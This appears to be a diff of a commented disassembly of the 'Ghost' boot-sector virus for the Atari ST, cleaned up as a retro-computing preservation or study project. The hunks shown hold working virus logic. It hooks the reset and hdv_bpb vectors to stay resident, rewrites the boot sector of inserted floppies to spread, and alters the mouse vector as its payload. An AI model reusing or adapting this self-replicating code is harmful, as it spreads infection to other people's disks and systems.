@@ -1,6 +1,15 @@
-; imhex: set offset to $122 to "simulate" copy to $140
-;
+; ----------------------------------------------------------------------------------------------------------
+; Ghost Virus / Atari ST
+; Original author: unknown
+; Disassembled using Easy Rider from an infected disk bootsector dump
+; Cleaned and commented by Shazz / MJJ Prod
+; (c) 2024
+; ----------------------------------------------------------------------------------------------------------
 
+; ----------------------------------------------------------------------------------------------------------
+; Debug, not in the original code
+; imhex: set offset to $122 to "simulate" copy to $140
+; ----------------------------------------------------------------------------------------------------------
 _DEBUG_                 equ 1
 DEBUG_ADDR              equ $310
 ; debug values
@@ -50,28 +59,28 @@ RESET_VECTOR_SUBPAGE    equ PAGE_SIZE*1
 ; Loader
 ; ----------------------------------------------------------------------------------------------------------
 LOADER:
-            MOVE.L    #$D6,D3 				            ; D3 = 214
-            LEA       RAM_ADDR.W,A1 		            ; A1 @ 320 (0x140) => 1st USER DEFINED VECTOR
-            LEA       LOADER(PC),A2			            ; A2 @ LOADER
-            MOVE.L    (A2),D2 				            ; STOP IF L001 IS IN 0x140
+            MOVE.L    #$D6,D3                           ; D3 = 214
+            LEA       RAM_ADDR.W,A1                     ; A1 @ 320 (0x140) => 1st USER DEFINED VECTOR
+            LEA       LOADER(PC),A2                     ; A2 @ LOADER
+            MOVE.L    (A2),D2                           ; STOP IF L001 IS IN 0x140
             CMP.L     (A1),D2
             BEQ       LOADER_END
-            MOVE.L    #RESVEC_MAGIC,D0 		            ; ELSE D0 = 0x31415926
-            CLR.L     D1					            ; D1 - 0
-            CMP.L     RESVEC_ENA.W,D0 			        ; IF @ 0x426 != 0x31415926 = >If this location contains the magic number $31415926
+            MOVE.L    #RESVEC_MAGIC,D0                  ; ELSE D0 = 0x31415926
+            CLR.L     D1                                ; D1 - 0
+            CMP.L     RESVEC_ENA.W,D0                   ; IF @ 0x426 != 0x31415926 => If this location contains the magic number $31415926
                                                         ; then the system will jump through resvector (42A) on a system reset
-            BNE       PASS_RESVEC 			            ; GOTO PASS_RESVEC
-            MOVE.L    RESVEC.W,D1 				        ; ELSE D1 = 0x42A
+            BNE       PASS_RESVEC                       ; GOTO PASS_RESVEC
+            MOVE.L    RESVEC.W,D1                       ; ELSE D1 = 0x42A
 PASS_RESVEC:
             LEA       ORIGINAL_RESET_VECTOR(PC),A0      ; A0 = payload start address (ORIGINAL_RESET_VECTOR)
-            MOVE.L    D1,(A0) 				            ; D1 = resvector address copied to empty space in ORIGINAL_RESET_VECTOR
-            MOVE.L    #RESET_VECTOR_ADDR,D2				; set relocated RESET_VECTOR address in D2 to be the reset vector address
-            MOVE.L    D2,RESVEC.W 				        ; resvector: If the magic number in resvalid is set properly, this vector will be
+            MOVE.L    D1,(A0)                           ; D1 = resvector address copied to empty space in ORIGINAL_RESET_VECTOR
+            MOVE.L    #RESET_VECTOR_ADDR,D2             ; set relocated RESET_VECTOR address in D2 to be the reset vector address
+            MOVE.L    D2,RESVEC.W                       ; resvector: If the magic number in resvalid is set properly, this vector will be
                                                         ; jumped through on a system reset with the return address placed in A6.
-            MOVE.L    D0,RESVEC_ENA.W 		            ; set magic value
+            MOVE.L    D0,RESVEC_ENA.W                   ; set magic value
 COPY_LOADER:
-            MOVE.W    (A2)+,(A1)+ 			            ; FOR i = 214 TO 0 (214 words so 428 bytes)
-            DBF       D3,COPY_LOADER		            ; COPY THIS PROGRAM A2+ (LOADER)+ to A1+ ($140)+
+            MOVE.W    (A2)+,(A1)+                       ; FOR i = 214 TO 0 (214 words so 428 bytes)
+            DBF       D3,COPY_LOADER                    ; COPY THIS PROGRAM A2+ (LOADER)+ to A1+ ($140)+
             MOVE.L    #COUNTER_DEFAULT,COUNTER_ADDR.W   ; reset counter to -10
             BSR.S     INSTALL_HDV_HPB
 LOADER_END: RTS
@@ -80,7 +89,7 @@ LOADER_END: RTS
 ; Reset vector flag and routine
 ; ----------------------------------------------------------------------------------------------------------
 ORIGINAL_RESET_VECTOR:
-            DCB.W     2,0 					            ; $190: resvector address will be written here
+            DCB.W     2,0                               ; $190: resvector address will be written here
 
 ; Concerning cold and warm reset. For every virus coder it is very important to know what's going on at reset
 ; sequence  esspecially concerning memory locations and system; vectors.
@@ -90,7 +99,7 @@ ORIGINAL_RESET_VECTOR:
 ; Note, as said, that if this code is the zeroed range, it will be exectuted THEN erased.
 
 RESET_VECTOR:                                           ; $194
-            MOVEA.L   PHYSTOP.W,A1 				        ; Set A1 to phystop (end of mem), $80000/524288 on 520ST
+            MOVEA.L   PHYSTOP.W,A1                      ; Set A1 to phystop (end of mem), $80000/524288 on 520ST
                                                         ; ghost looks to install itself at a required $200 boundary page
                                                         ; at page 40 ($8000) - 1 ($200)
             SUBA.L    #RESET_VECTOR_PAGE,A1
@@ -145,7 +154,7 @@ INSTALL_HDV_HPB:
             ADDQ.B    #1,4+DEBUG_ADDR.W
             endc
             MOVE.L    #RESVEC_MAGIC,RESVEC_ENA.W        ; set magic value
-            MOVE.L    HDV_BPB.W,D0 				        ; hdv_bpb: This vector is used when Getbpb() is called.
+            MOVE.L    HDV_BPB.W,D0                      ; hdv_bpb: This vector is used when Getbpb() is called.
                                                         ; A value of 0 indicates that no hard disk is attached.
                                                         ; Applications installing themselves here should expect
                                                         ; parameters to be located on the stack as they would be for the actual function call beginning at 4(sp).
@@ -175,7 +184,7 @@ HDV_HPB_VECTOR:
             MOVEA.L   (A5),A5                           ;
             MOVEA.L   A5,A6                             ;
             MOVE.L    A5,-(sp)                          ; buf = (BOOTSECT_BUF)
-            MOVE.W    #FLOPRD,-(sp) 	                ; FLOPRD
+            MOVE.W    #FLOPRD,-(sp)                     ; FLOPRD
             TRAP      #XBIOS
             ADDA.L    #$14,sp                           ; fix stack
             TST.W     D0                                ; 0 = success
@@ -202,7 +211,7 @@ CALC_BOOT_CHK:
             MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
             CLR.L     -(sp)                             ; rsrvd = 0
             MOVE.L    A6,-(sp)                          ; buf = (BOOTSECT_BUF)
-            MOVE.W    #FLOPWR,-(sp) 	                ; FLOPWR
+            MOVE.W    #FLOPWR,-(sp)                     ; FLOPWR
             TRAP      #XBIOS
             ADDA.L    #$14,sp                           ; fix stack
             TST.W     D0                                ; success if 0
@@ -211,7 +220,7 @@ CALC_BOOT_CHK:
             CMPI.L    #5,COUNTER_ADDR.W                 ; if not 5 quit (starting fron 251, meaning 10 iterations then reset to 0 so 5 to 5)
             BNE       HDV_HPB_VECTOR_END
             CLR.L     COUNTER_ADDR.W                    ; else set mousevec
-            MOVE.W    #KBDVBASE,-(sp) 	                ; Kbdvbase() returns a pointer to a system structure containing a ‘jump’ table to system vector handlers.
+            MOVE.W    #KBDVBASE,-(sp)                   ; Kbdvbase() returns a pointer to a system structure containing a ‘jump’ table to system vector handlers.
             TRAP      #XBIOS
             ADDQ.L    #2,sp                             ; fix stack, midivec, vkbderr, vmiderr , statvec, mousevec, clockvec, joyvec pointers struct in set in D0
             ADD.L     #MOUSEVEC_OFFSET,D0               ; D0+16 => mousevec
@@ -244,7 +253,7 @@ COUNTER:
 
 END:        DC.B      $00,$00
 
-PROG_END:DCB.W        24,0
-            DC.B      'J',$97
+PROG_END:DCB.W        24,0                              ; useless, kept for checking result is
+            DC.B      'J',$97                           ; identical to the original virus
 
     END
